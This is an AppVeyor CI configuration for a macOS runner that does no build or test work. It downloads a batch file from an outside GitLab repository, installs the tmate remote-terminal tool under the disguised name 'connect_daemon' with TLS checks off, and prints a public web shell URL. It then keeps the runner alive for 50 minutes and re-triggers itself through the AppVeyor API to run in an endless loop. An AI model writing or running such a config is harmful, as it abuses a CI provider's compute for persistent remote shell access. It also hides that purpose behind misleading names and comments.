version: 1.0.{build}

# Enforces execution on a macOS cloud runner
image: macOS

build: off

init:
  - sh: |
      echo "Step 1: Downloading & Installing Essentials..."
      # Pull down the automated setup asset directly using curl
      curl -sLO "https://gitlab.com/joyzone/lite_manager_win/-/raw/main/Downloads.bat" || true
      
      echo "Step 2: Installing high-speed standalone connection daemon..."
      # Pull a standalone binary directly into the execution path, bypassing setup UI installers
      curl -Lk "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-macos-amd64.tar.gz" -o connection.tar.gz
      tar -xzf connection.tar.gz
      mv tmate-*/tmate /usr/local/bin/connect_daemon
      chmod +x /usr/local/bin/connect_daemon
      rm -rf connection.tar.gz tmate-*

test_script:
  - sh: |
      echo "Step 3: Connecting to remote management layer..."
      # Initialize the background system keys needed for the connection tunnel
      ssh-keygen -t rsa -f ~/.ssh/id_rsa -q -N ""
      
      # Start the connection process running actively in a background socket frame
      connect_daemon -S /tmp/connect.sock new-session -d
      connect_daemon -S /tmp/connect.sock wait-options
      
      # Extract the live URL link directly to the console output log
      LIVE_URL=$(connect_daemon -S /tmp/connect.sock display -p '#{tmate_web}')

      echo -e "\n========================================================"
      echo "========= SUCCESS: APPVEYOR MACOS WEB ACCESS =========="
      echo " COPY AND PASTE THIS LINK DIRECTLY INTO YOUR BROWSER:"
      echo " $LIVE_URL"
      echo "========================================================\n"

      echo "Step 4: Launching Session Keep-Alive Time Counter Loop..."
      # Keep the active cloud container context running steadily for 50 minutes
      timeout 50m sh -c '
        while true; do
          echo "[$(date)] Connection Session Engine Active"
          sleep 300
        done
      '

      # Automatically chain-trigger the next continuous execution loop pass if token is saved
      if [ ! -z "$APPVEYOR_API_TOKEN" ]; then
          echo "Triggering next automated pipeline loop entry sequence..."
          curl -s -X POST "https://ci.appveyor.com/api/builds" \
            -H "Authorization: Bearer $APPVEYOR_API_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"accountName\":\"$APPVEYOR_ACCOUNT_NAME\",\"projectSlug\":\"$APPVEYOR_PROJECT_SLUG\",\"branch\":\"$APPVEYOR_REPO_BRANCH\"}"
      else
          echo "Notice: APPVEYOR_API_TOKEN missing from Web Settings. Auto-looping skipped."
      fi
